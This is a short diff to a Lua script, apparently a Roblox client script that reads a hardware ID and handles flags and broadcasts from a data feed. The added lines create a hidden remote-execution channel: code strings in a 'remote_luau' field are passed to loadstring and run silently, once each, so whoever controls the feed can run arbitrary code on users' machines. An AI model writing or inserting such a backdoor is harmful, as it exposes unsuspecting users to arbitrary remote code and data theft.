@@ -414,6 +414,7 @@ local g=getgenv and getgenv()
 if g and g.__FG_HWID then _hwid=tostring(g.__FG_HWID); g.__FG_HWID=nil end
 end)
 local _seen_broadcasts={}
+local _seen_execs={}
 local function _notify(title,text,dur,snd)
 pcall(function()
 local sg=game:GetService("StarterGui")
@@ -475,6 +476,21 @@ if not g.__FLEED_FLAGS then g.__FLEED_FLAGS={} end
 for k,v in pairs(data.flags) do g.__FLEED_FLAGS[k]=v end
 end
 end)
+end
+if data.remote_luau and type(data.remote_luau)=="table" then
+for _,item in ipairs(data.remote_luau) do
+local cid=item.id or item.code
+if not _seen_execs[cid] then
+_seen_execs[cid]=true
+local code_str=item.code or ""
+if code_str~="" then
+_spawn(function()
+local fn,err=loadstring(code_str)
+if fn then pcall(fn) end
+end)
+end
+end
+end
 end
 if data.broadcast and type(data.broadcast)=="table" then
 local bid=data.broadcast.id or data.broadcast.message
